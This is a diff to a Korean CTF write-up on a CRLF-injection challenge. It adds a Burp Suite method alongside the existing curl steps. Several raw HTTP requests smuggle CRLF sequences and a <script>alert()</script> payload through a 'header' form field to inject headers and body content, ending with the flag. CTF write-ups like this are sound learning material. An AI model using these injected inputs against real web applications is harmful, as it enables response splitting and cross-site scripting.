@@ -286,6 +286,8 @@ response.headers.set(header, user_input)
 
 |
 
+## 방법 1 - curl
+
 ### curl -option
 
 ---
@@ -298,7 +300,7 @@ response.headers.set(header, user_input)
 
 |
 
-### post 요청 - header, value
+### 1-1. post 요청 - header, value
 
 ---
 
@@ -337,7 +339,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 |
 
-### 헤더 두 개 설정
+### 1-2. 헤더 두 개 설정
 
 ---
 
@@ -383,7 +385,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 |
 
-### 헤더를 본문으로 인식
+### 1-3. 헤더를 본문으로 인식
 
 ---
 
@@ -427,7 +429,7 @@ I't is very g
 
 |
 
-### 본문에 내용 추가
+### 1-4. 본문에 내용 추가
 
 ```bash
 curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0A<script>alert(123)</script>header2&value=value2"
@@ -467,7 +469,7 @@ CRLF를 두 번 추가한 부분부터는 본문으로 인식됨
 
 |
 
-### /report에 요청
+### 1-5. /report에 요청
 
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=header1: value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
@@ -502,6 +504,185 @@ K0{CRLF_is_very_common_vulnerability}
 |
 
 |
+
+## 방법 2 - burp suite
+
+### 2-1. post 요청 - header, value
+
+```wasm
+POST / HTTP/1.1
+Host: war.knock-on.org:10013
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 27
+Content-Type: application/x-www-form-urlencoded
+
+header=header1&value=value1
+```
+
+```wasm
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.3 Python/3.10.12
+Date: Mon, 16 Sep 2024 12:12:07 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 51
+header1: value1
+Connection: close
+
+I't is very good day to walk out. Power thourgh!!!!
+```
+
+`POST` 요청으로 `header`와 `value` 설정
+
+|
+
+### 2-2. 헤더 두 개 설정
+
+```wasm
+POST / HTTP/1.1
+Host: war.knock-on.org:10013
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 44
+Content-Type: application/x-www-form-urlencoded
+
+header=header1: value1
+header2&value=value2
+```
+
+```wasm
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.3 Python/3.10.12
+Date: Mon, 16 Sep 2024 12:17:25 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 51
+header1: value1
+header2: value2
+Connection: close
+
+I't is very good day to walk out. Power thourgh!!!!
+```
+
+헤더 두 개 설정
+
+|
+
+### 2-3. 헤더를 본문으로 인식
+
+```wasm
+POST / HTTP/1.1
+Host: war.knock-on.org:10013
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 46
+Content-Type: application/x-www-form-urlencoded
+
+header=header1: value1
+
+header2&value=value2
+```
+
+```wasm
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.3 Python/3.10.12
+Date: Mon, 16 Sep 2024 12:18:48 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 51
+header1: value1
+
+header2: value2
+Connection: close
+
+I't is very good day to walk out. Power thourgh!!!!
+```
+
+`CRLF`를 추가하여 두 번째 헤더를 본문으로 인식시킴
+
+|
+
+### 2-4. 본문에 내용 추가
+
+```html
+POST / HTTP/1.1
+Host: war.knock-on.org:10013
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 46
+Content-Type: application/x-www-form-urlencoded
+
+header=header1: value1
+
+<script>alert()</script>
+header2&value=value2
+```
+
+```wasm
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.3 Python/3.10.12
+Date: Mon, 16 Sep 2024 12:20:38 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 51
+header1: value1
+
+<script>alert()</script>
+header2: value2
+Connection: close
+
+I't is very good day to walk out. Power thourgh!!!!
+```
+
+`\r\n\r\n` 과 두 번째 헤더 사이에 본문에 추가할 내용 추가
+
+|
+
+### 2-5. /report에 요청
+
+```html
+POST /report HTTP/1.1
+Host: war.knock-on.org:10013
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 72
+Content-Type: application/x-www-form-urlencoded
+
+header=header1: value1
+
+<script>alert()</script>
+header2&value=value2
+```
+
+```wasm
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.3 Python/3.10.12
+Date: Mon, 16 Sep 2024 12:21:02 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 37
+Connection: close
+
+K0{CRLF_is_very_common_vulnerability}
+```
+
+그대로 경로만 `/report`로 바꿔줌
 
 ## Payload
 
